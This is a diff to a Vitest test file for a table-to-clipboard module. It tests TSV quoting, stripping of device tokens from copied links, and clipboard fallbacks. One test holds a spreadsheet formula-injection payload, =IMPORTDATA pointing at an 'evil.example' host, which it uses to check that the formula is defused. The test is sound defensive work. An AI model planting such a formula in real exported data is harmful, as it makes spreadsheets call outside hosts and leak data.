@@ -3,7 +3,7 @@ import { createElement } from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { Markdown } from "./Markdown";
-import { cellPlainText, quoteTsvField, tableToTsv, writeTableClipboard } from "./tableCopy";
+import { cellPlainText, quoteTsvField, tableHtml, tableToTsv, withoutToken, writeTableClipboard } from "./tableCopy";
 
 function table(html: string): HTMLTableElement {
   const doc = new DOMParser().parseFromString(`<table>${html}</table>`, "text/html");
@@ -52,12 +52,34 @@ describe("tableToTsv", () => {
       <span class="katex-html" aria-hidden="true">x</span></span>
       <table><tr><td>nested</td></tr></table>
     </td></tr>`);
-    expect(cellPlainText(root.rows[0].cells[0])).toBe("x");
-    expect(tableToTsv(root)).toBe("x");
+    expect(cellPlainText(root.rows[0].cells[0])).toBe("x^2");
+    expect(tableToTsv(root)).toBe("x^2");
   });
 
   it("is undefined when there is no row", () => {
     expect(tableToTsv(table(""))).toBeUndefined();
+  });
+
+  it("keeps an image's alt text and a blank line, and does not turn a formula into a live cell", () => {
+    expect(tableToTsv(table(`<tr><td>see <img alt="cat" src="cat.png"></td><td>a<br><br>b</td></tr>`))).toBe('see cat\t"a\n\nb"');
+    expect(quoteTsvField("=IMPORTDATA(\"https://evil.example/x\")")).toBe("\"'=IMPORTDATA(\"\"https://evil.example/x\"\")\"");
+    expect(quoteTsvField("-3")).toBe("-3");
+    expect(quoteTsvField("@SUM(A1)")).toBe("'@SUM(A1)");
+  });
+});
+
+describe("tableHtml", () => {
+  it("drops the device token and the duplicate formula tree", () => {
+    const root = table(`<tr><td><a href="/api/v1/machines/m/file/download?path=a.log&amp;cwd=&amp;inline=1&amp;token=device-token">log</a>
+      <span class="katex"><span class="katex-mathml"><math><annotation>x^2</annotation></math></span><span class="katex-html">x²</span></span></td></tr>`);
+    const html = tableHtml(root);
+    expect(html).not.toContain("device-token");
+    expect(html).not.toContain("token=");
+    expect(html).toContain("path=a.log");
+    expect(html).toContain("inline=1");
+    expect(html).toContain("katex-html");
+    expect(html).not.toContain("katex-mathml");
+    expect(withoutToken("https://hub.example/file?path=a&token=device-token")).toBe("https://hub.example/file?path=a");
   });
 });
 
@@ -145,6 +167,44 @@ describe("writeTableClipboard", () => {
       expect(rich).toBe("<table></table>");
     } finally {
       document.execCommand = previous;
+    }
+  });
+
+  it("keeps the tsv with writeText when the two-format write is refused", async () => {
+    const writeText = vi.fn(async () => {});
+    const write = vi.fn(async () => {
+      throw new Error("denied");
+    });
+    vi.stubGlobal("ClipboardItem", class {
+      constructor(readonly parts: Record<string, Blob>) {}
+    });
+    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { write, writeText } });
+    const exec = vi.fn(() => true);
+    const previous = document.execCommand;
+    document.execCommand = exec as typeof document.execCommand;
+    try {
+      expect(await writeTableClipboard("a\tb", "<table></table>")).toBe(true);
+      expect(writeText).toHaveBeenCalledWith("a\tb");
+      expect(exec).not.toHaveBeenCalled();
+    } finally {
+      document.execCommand = previous;
+    }
+  });
+
+  it("puts focus back after the plain-http fallback", async () => {
+    const btn = document.createElement("button");
+    document.body.appendChild(btn);
+    btn.focus();
+    vi.stubGlobal("ClipboardItem", undefined);
+    Object.defineProperty(navigator, "clipboard", { configurable: true, value: undefined });
+    const previous = document.execCommand;
+    document.execCommand = (() => true) as typeof document.execCommand;
+    try {
+      expect(await writeTableClipboard("a", "<table></table>")).toBe(true);
+      expect(document.activeElement).toBe(btn);
+    } finally {
+      document.execCommand = previous;
+      btn.remove();
     }
   });
 });
